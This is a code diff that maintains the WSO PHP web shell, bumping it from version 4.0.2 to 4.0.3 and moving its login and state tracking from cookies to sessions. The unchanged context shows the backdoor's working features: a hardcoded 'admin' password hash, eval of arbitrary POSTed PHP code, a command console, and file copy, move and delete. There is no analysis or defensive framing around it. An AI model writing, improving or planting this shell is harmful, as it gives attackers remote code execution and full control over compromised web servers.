@@ -1,5 +1,5 @@
 <?php
-/* WSO 4.0.2 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.3 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.2');
+@define('VERSION', '4.0.3');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -31,10 +31,10 @@ function printLogin() {
 	<?php
 	exit;
 }
-if( !isset( $_COOKIE[md5($_SERVER['HTTP_HOST'])] ))
+if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
 	if( empty( $auth_pass ) ||
 		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
-		$_COOKIE[md5($_SERVER['HTTP_HOST'])] = true;
+		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 	else
 		printLogin();
 
@@ -437,7 +437,7 @@ function actionSecInfo() {
 
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
-		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
 		ob_start();
 		eval($_POST['p1']);
 		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
@@ -459,9 +459,9 @@ function actionPhp() {
 		echo '</div><br>';
 	}
 	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
 		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
-	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
+	echo ' <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
 	if(!empty($_POST['p1'])) {
 		ob_start();
 		eval($_POST['p1']);
@@ -512,7 +512,7 @@ function actionFilesMan() {
 					}
 				break;
 			case 'paste':
-				if($_COOKIE['act'] == 'copy') {
+				if($_SESSION['act'] == 'copy') {
 					function copy_paste($c,$s,$d){
 						if(is_dir($c.$s)){
 							mkdir($d.$s);
@@ -525,9 +525,9 @@ function actionFilesMan() {
 							@copy($c.$s, $d.$s);
 						}
 					}
-					foreach($_COOKIE['f'] as $f)
-						copy_paste($_COOKIE['cwd'],$f, $GLOBALS['cwd']);					
-				} elseif($_COOKIE['act'] == 'move') {
+					foreach($_SESSION['f'] as $f)
+						copy_paste($_SESSION['cwd'],$f, $GLOBALS['cwd']);					
+				} elseif($_SESSION['act'] == 'move') {
 					function move_paste($c,$s,$d){
 						if(is_dir($c.$s)){
 							mkdir($d.$s);
@@ -540,18 +540,18 @@ function actionFilesMan() {
 							@copy($c.$s, $d.$s);
 						}
 					}
-					foreach($_COOKIE['f'] as $f)
-						@rename($_COOKIE['cwd'].$f, $GLOBALS['cwd'].$f);
+					foreach($_SESSION['f'] as $f)
+						@rename($_SESSION['cwd'].$f, $GLOBALS['cwd'].$f);
 				}
-				unset($_COOKIE['f']);
+				unset($_SESSION['f']);
 				break;
 			default:
 				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')) ) {
-					$_COOKIE['act'] = @$_POST['p1'];
-					$_COOKIE['f'] = @$_POST['f'];
-					foreach($_COOKIE['f'] as $k => $f)
-						$_COOKIE['f'][$k] = urldecode($f);
-					$_COOKIE['cwd'] = @$_POST['c'];
+					$_SESSION['act'] = @$_POST['p1'];
+					$_SESSION['f'] = @$_POST['f'];
+					foreach($_SESSION['f'] as $k => $f)
+						$_SESSION['f'][$k] = urldecode($f);
+					$_SESSION['cwd'] = @$_POST['c'];
 				}
 				break;
 		}
@@ -619,7 +619,7 @@ function actionFilesMan() {
 	<input type=hidden name=a value='FilesMan'>
 	<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'>
 	<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
-	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(!empty($_COOKIE['act'])&&@count($_COOKIE['f'])){?><option value='paste'>Paste</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
+	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?><option value='paste'>Paste</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
 	</form></table></div>
 	<?php
 	printFooter();
@@ -670,7 +670,7 @@ function actionStringTools() {
 	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
 	foreach($stringTools as $k => $v)
 		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
-		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
+		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
 	if(!empty($_POST['p1'])) {
 		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
 	}
@@ -922,7 +922,7 @@ function actionSafeMode() {
 
 function actionConsole() {
 	if(isset($_POST['ajax'])) {
-		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
 		ob_start();
 		echo "document.cf.cmd.value='';\n";
 		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
@@ -977,8 +977,8 @@ function add(cmd) {
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
 	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
-	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
 	}
@@ -988,7 +988,7 @@ function add(cmd) {
 }
 
 function actionLogout() {
-	unset($_COOKIE[md5($_SERVER['HTTP_HOST'])]);
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
 
